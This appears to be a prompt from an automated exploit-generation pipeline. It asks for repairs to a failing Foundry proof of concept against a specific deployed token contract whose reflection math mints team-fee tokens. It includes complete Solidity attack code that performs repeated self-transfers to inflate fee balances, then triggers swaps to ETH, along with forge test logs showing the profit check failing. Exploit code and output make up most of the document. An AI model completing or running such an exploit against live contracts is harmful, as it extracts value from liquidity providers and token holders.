You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Broken reflection math mints team-fee tokens out of thin air
- claim: The reflection calculation subtracts only the reflected tax fee from the recipient amount. `_getTValues()` removes both `tFee` and `tteam` from the transfer amount, but `_getRValues()` receives only `tFee` and computes `rTransferAmount = rAmount - rFee`, while `_taketeam()` still credits the contract with `tteam`. This makes each taxed transfer credit the recipient as if no team fee were removed while also crediting the contract with the team fee.
- impact: The token supply invariant is broken and team-fee transfers inflate balances. Those extra tokens accumulate in the contract and can later be swapped for ETH and forwarded to the fee wallets, extracting value from AMM liquidity. The issue is especially dangerous on self-transfers when `_teamFee > 0` and `_taxFee == 0`, because the sender's net balance does not decrease by the team fee while the contract still gains fee tokens.
- exploit_paths: ["Owner enables `_teamFee` through `_setteamFee()` while `_taxFee` is still 0 or low.", "Any non-excluded account performs transfers; on a self-transfer the sender only loses the reflected tax fee, not the team fee.", "`_taketeam()` credits the contract with newly created reflected value.", "Later transfers trigger `swapTokensForEth()` and `sendETHToteam()`, converting the inflated tokens into ETH taken from the pool."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02Like {
    function WETH() external view returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface ITomInu is IERC20Like {
    function owner() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function tradingEnabled() external view returns (bool);
    function cooldownEnabled() external view returns (bool);
    function swapEnabled() external view returns (bool);
    function _maxTxAmount() external view returns (uint256);
    function _teamWalletAddress() external view returns (address payable);
    function _marketingWalletAddress() external view returns (address payable);
}

contract Sink {
    receive() external payable {}
}

contract FlawVerifier {
    address public constant TARGET = 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F;
    uint256 internal constant SWAP_THRESHOLD = 5_000_000_000_000_000;

    uint256 internal constant STATUS_IDLE = 0;
    uint256 internal constant STATUS_NO_CAPITAL = 1;
    uint256 internal constant STATUS_TRADING_DISABLED = 2;
    uint256 internal constant STATUS_BUY_FAILED = 3;
    uint256 internal constant STATUS_COOLDOWN_BLOCKS_STAGE2 = 4;
    uint256 internal constant STATUS_NO_TEAM_MINT_OBSERVED = 5;
    uint256 internal constant STATUS_VALIDATED_NO_PROFIT = 6;
    uint256 internal constant STATUS_PROFIT = 7;

    address public immutable sink;

    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    uint256 public lastStatus;
    uint256 public observedMintToContract;
    uint256 public observedAttackerBalanceLoss;
    uint256 public observedFeeWalletEthIncrease;
    uint256 public observedSelfTransferAmount;
    uint256 public observedTriggerTransferAmount;
    uint256 public startingEthBalance;
    uint256 public endingEthBalance;

    uint256 private _profitAmount;

    constructor() {
        sink = address(new Sink());
    }

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        ITomInu token = ITomInu(TARGET);
        IUniswapV2Router02Like router = IUniswapV2Router02Like(token.uniswapV2Router());

        startingEthBalance = address(this).balance;
        endingEthBalance = address(this).balance;
        _profitAmount = 0;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        lastStatus = STATUS_IDLE;
        observedMintToContract = 0;
        observedAttackerBalanceLoss = 0;
        observedFeeWalletEthIncrease = 0;
        observedSelfTransferAmount = 0;
        observedTriggerTransferAmount = 0;

        bool boughtThisCall;
        uint256 initialTokenBalance = token.balanceOf(address(this));

        if (initialTokenBalance == 0) {
            if (address(this).balance == 0) {
                lastStatus = STATUS_NO_CAPITAL;
                return;
            }
            if (!token.tradingEnabled()) {
                lastStatus = STATUS_TRADING_DISABLED;
                return;
            }

            address[] memory buyPath = new address[](2);
            buyPath[0] = router.WETH();
            buyPath[1] = TARGET;

            try router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
                0,
                buyPath,
                address(this),
                block.timestamp
            ) {
                boughtThisCall = true;
            } catch {
                lastStatus = STATUS_BUY_FAILED;
                return;
            }

            initialTokenBalance = token.balanceOf(address(this));
            if (initialTokenBalance == 0) {
                lastStatus = STATUS_BUY_FAILED;
                return;
            }

            if (token.cooldownEnabled()) {
                // Exploit path 0 precondition: owner enables `_teamFee` through `_setteamFee()` while `_taxFee` is still 0 or low.
                // This verifier cannot impersonate the owner, so stage 0 must already be live on the fork.
                // Exploit path 1 execution: any non-excluded account performs transfers; on a self-transfer the sender
                // only loses the reflected tax fee, not the team fee. If we had to buy in this same call, pair->buyer
                // cooldown prevents the immediate follow-up self-transfer, so this attempt stops here instead of cheating.
                lastStatus = STATUS_COOLDOWN_BLOCKS_STAGE2;
                endingEthBalance = address(this).balance;
                return;
            }
        }

        uint256 maxTxAmount = token._maxTxAmount();
        uint256 feeWalletEthBefore = token._teamWalletAddress().balance + token._marketingWalletAddress().balance;

        // Exploit path 0 precondition: owner enables `_teamFee` through `_setteamFee()` while `_taxFee` is still 0 or low.
        // We cannot call `_setteamFee()` here; instead we only proceed against the fork's live configuration.
        bool minted = _inflateContractTeamBalance(token, maxTxAmount);

        if (!minted) {
            lastStatus = STATUS_NO_TEAM_MINT_OBSERVED;
            _unwindBoughtInventory(token, router, boughtThisCall);
            _finalizeProfit();
            return;
        }

        hypothesisValidated = true;

        uint256 contractTokenBalance = token.balanceOf(TARGET);
        if (token.swapEnabled() && contractTokenBalance >= SWAP_THRESHOLD) {
            uint256 triggerAmount = _boundedTransferAmount(token.balanceOf(address(this)), maxTxAmount);
            if (triggerAmount > 1) {
                observedTriggerTransferAmount = triggerAmount;
                // Exploit path 3: later transfers trigger `swapTokensForEth()` and `sendETHToteam()`, converting
                // the inflated tokens sitting on the token contract into ETH that is paid out to the fee wallets.
                // A tiny public transfer is the realistic on-chain action that crosses the token's normal swap hook.
                try token.transfer(sink, triggerAmount) returns (bool success) {
                    success;
                } catch {}
            } else {
                try token.transfer(sink, 1) returns (bool success) {
                    success;
                } catch {}
            }
        }

        uint256 feeWalletEthAfter = token._teamWalletAddress().balance + token._marketingWalletAddress().balance;
        if (feeWalletEthAfter > feeWalletEthBefore) {
            observedFeeWalletEthIncrease = feeWalletEthAfter - feeWalletEthBefore;
        }

        _unwindBoughtInventory(token, router, boughtThisCall);
        _finalizeProfit();
        lastStatus = _profitAmount > 0 ? STATUS_PROFIT : STATUS_VALIDATED_NO_PROFIT;
    }

    function _inflateContractTeamBalance(ITomInu token, uint256 maxTxAmount) internal returns (bool minted) {
        for (uint256 i = 0; i < 32; ++i) {
            uint256 attackerBefore = token.balanceOf(address(this));
            if (attackerBefore <= 1) {
                break;
            }

            uint256 contractBefore = token.balanceOf(TARGET);
            uint256 amount = _boundedTransferAmount(attackerBefore, maxTxAmount);
            if (amount == 0) {
                break;
            }

            observedSelfTransferAmount = amount;

            // Exploit path 1: any non-excluded account performs transfers; on a self-transfer the sender only loses
            // the reflected tax fee, not the team fee.
            bool ok;
            try token.transfer(address(this), amount) returns (bool success) {
                ok = success;
            } catch {
                break;
            }
            if (!ok) {
                break;
            }

            uint256 contractAfter = token.balanceOf(TARGET);
            uint256 attackerAfter = token.balanceOf(address(this));

            // Exploit path 2: `_taketeam()` credits the contract with newly created reflected value.
            if (contractAfter > contractBefore) {
                minted = true;
                observedMintToContract += contractAfter - contractBefore;
            }

            if (attackerBefore > attackerAfter) {
                observedAttackerBalanceLoss += attackerBefore - attackerAfter;
            }

            if (contractAfter >= SWAP_THRESHOLD) {
                break;
            }
        }
    }

    function _boundedTransferAmount(uint256 balance, uint256 maxTxAmount) internal pure returns (uint256) {
        if (balance <= 1) {
            return 0;
        }

        uint256 amount = balance - 1;
        if (maxTxAmount != 0 && amount > maxTxAmount) {
            amount = maxTxAmount;
        }
        return amount;
    }

    function _unwindBoughtInventory(ITomInu token, IUniswapV2Router02Like router, bool boughtThisCall) internal {
        if (!boughtThisCall) {
            return;
        }

        uint256 tokenBalance = token.balanceOf(address(this));
        if (tokenBalance == 0) {
            return;
        }

        try token.approve(address(router), type(uint256).max) returns (bool success) {
            success;
        } catch {
            return;
        }

        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = router.WETH();

        try router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            sellPath,
            address(this),
            block.timestamp
        ) {} catch {}
    }

    function _finalizeProfit() internal {
        endingEthBalance = address(this).balance;
        if (endingEthBalance > startingEthBalance) {
            _profitAmount = endingEthBalance - startingEthBalance;
        } else {
            _profitAmount = 0;
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.80s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 91012)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [91012] FlawVerifierTest::testExploit()
    ├─ [188] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [66752] FlawVerifier::executeOnOpportunity()
    │   ├─ [310] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::uniswapV2Router() [staticcall]
    │   │   └─ ← [Return] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
    │   ├─ [20777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [188] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [336] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 835.92ms (1.13ms CPU time)

Ran 1 test suite in 847.28ms (835.92ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 91012)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
